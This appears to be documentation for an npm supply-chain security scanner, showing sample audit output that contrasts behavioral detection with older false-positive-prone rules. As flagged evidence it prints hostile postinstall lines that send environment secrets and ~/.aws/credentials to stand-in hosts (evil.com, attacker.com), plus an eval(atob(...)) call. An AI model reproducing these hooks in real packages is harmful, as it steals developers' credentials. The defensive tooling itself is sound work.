# Example: Behavioral Security Detection Output

## Example 1: Supply Chain Attack Detected (event-stream style)

```
🔍 Auditing package security...
   Installing malicious-package in sandbox...
   Scanning source code...

═══════════════════════════════════════════
📦 Package: malicious-package
🛡️  Risk Level: ☠ CRITICAL │ Score: 175
═══════════════════════════════════════════

🚨 SUPPLY CHAIN ATTACK PATTERNS DETECTED!
─────────────────────────────────────────

🔴 CRITICAL Data Exfiltration Chain (Score: +100)
  SUPPLY CHAIN ATTACK: Potential data exfiltration detected - accesses sensitive data and makes network requests
  Evidence:
    → Uses encoding/obfuscation
    → Makes network requests
    → Accesses sensitive data (env vars, credentials)

🔴 CRITICAL Heavy Obfuscation Chain (Score: +80)
  SUPPLY CHAIN ATTACK: Heavy code obfuscation detected - intentionally hiding malicious behavior
  Evidence:
    → 5 instances of code obfuscation
    → Dynamic code execution with obfuscated input

─────────────────────────────────────────

📜 Install Scripts:
  postinstall: require('https').request('https://evil.com', {body: atob(process.env.SECRET)})

⚠️  Suspicious Patterns Detected:
  • require('https: HTTPS requests
  • process.env: Accesses environment variables
  • base64: Obfuscated code

🚨 CRITICAL Code Issues:
  ⚠ Base64 obfuscated code execution (node_modules/malicious-package/index.js:45)
    Decodes and executes base64 encoded code - highly suspicious
    Code: eval(atob('bWFsaWNpb3VzX2NvZGU='))...

  ⚠ eval() usage (node_modules/malicious-package/index.js:45)
    Executes arbitrary code - high risk for code injection
    Code: eval(atob('bWFsaWNpb3VzX2NvZGU='))...

⚠️  Code Warnings:
  • External HTTP request (node_modules/malicious-package/index.js:23)
  • Sensitive file/env access (node_modules/malicious-package/index.js:23)

📊 Issue Summary:
  🚨 2 critical
  ⚠️  2 warnings
  📝 4 total issues

═══════════════════════════════════════════

⚠️  CRITICAL RISK DETECTED! Continue anyway? (y/N)
```

## Example 2: Legitimate Build Tool (TypeScript)

```
🔍 Auditing package security...
   Installing typescript in sandbox...
   Scanning source code...

═══════════════════════════════════════════
📦 Package: typescript
🛡️  Risk Level: ⚠ LOW │ Score: 18
═══════════════════════════════════════════

✓ No install scripts found

⚠️  Code Warnings:
  • Dynamic function creation (node_modules/typescript/lib/tsc.js:1234)
  • System command execution (node_modules/typescript/lib/tsc.js:5678)

📊 Issue Summary:
  🚨 0 critical
  ⚠️  2 warnings
  📝 2 total issues

═══════════════════════════════════════════

✓ Package appears safe to install
```

## Example 3: Credential Theft Attack

```
🔍 Auditing package security...
   Installing credential-stealer in sandbox...
   Scanning source code...

═══════════════════════════════════════════
📦 Package: credential-stealer
🛡️  Risk Level: ☠ CRITICAL │ Score: 103
═══════════════════════════════════════════

🚨 SUPPLY CHAIN ATTACK PATTERNS DETECTED!
─────────────────────────────────────────

🔴 CRITICAL Credential Theft Chain (Score: +95)
  SUPPLY CHAIN ATTACK: Credential theft pattern - accesses credential files and can transmit data
  Evidence:
    → Accesses credential files (.ssh, .aws, .npmrc)
    → Can transmit or write data externally

─────────────────────────────────────────

📜 Install Scripts:
  postinstall: curl -X POST -d @~/.aws/credentials http://attacker.com/steal

⚠️  Suspicious Patterns Detected:
  • curl: Downloads files from internet
  • ~/.aws: Accesses AWS credentials

📊 Issue Summary:
  🚨 0 critical
  ⚠️  0 warnings
  📝 0 total issues

═══════════════════════════════════════════

⚠️  CRITICAL RISK DETECTED! Continue anyway? (y/N)
```

## Example 4: Transitive Dependency Scan

```
🔍 Auditing installed dependencies...
   Max depth: 2
⠋ Scanning installed: express

📊 TRANSITIVE DEPENDENCY SCAN SUMMARY
═══════════════════════════════════════════

Total packages found: 57
Successfully scanned: 57
Maximum depth reached: 2

Security Summary:
  Packages with install scripts: 3
  High/Critical risk packages: 1
  Medium risk packages: 0

⚠️  HIGH RISK PACKAGES:

  • node-ipc - ☠ CRITICAL

    🔴 CRITICAL Data Exfiltration Chain (Score: +100)
      SUPPLY CHAIN ATTACK: Potential data exfiltration detected
      Evidence:
        → Makes network requests
        → Accesses sensitive data (env vars, credentials)
    
    → External HTTP request (node_modules/node-ipc/index.js:123)
      Makes HTTP requests to external servers
    → Sensitive file/env access (node_modules/node-ipc/index.js:124)
      Accesses sensitive files or environment variables

📊 Found 1 total security issues across all packages.

═══════════════════════════════════════════
```

## Key Differences from Before

### Before (Traditional Detection)
```
📦 Package: typescript
🛡️  Risk Level: ☠ CRITICAL  <-- FALSE POSITIVE

🚨 CRITICAL Code Issues:
  ⚠ eval() usage
  ⚠ Dynamic function creation
```

### After (Behavioral Detection)
```
📦 Package: typescript
🛡️  Risk Level: ⚠ LOW │ Score: 18  <-- CORRECTLY CLASSIFIED

⚠️  Code Warnings:
  • Dynamic function creation
  
No behavioral attack chains detected ✓
```

## Summary

The new behavioral detection system:

1. **Prioritizes behavioral chains** - Shows supply chain attack patterns first
2. **Provides context** - Explains WHY something is suspicious
3. **Reduces false positives** - TypeScript is Low, not Critical
4. **Catches real attacks** - Data exfiltration, credential theft, etc.
5. **Shows risk score** - Transparent scoring system
6. **Includes evidence** - Specific patterns that triggered detection
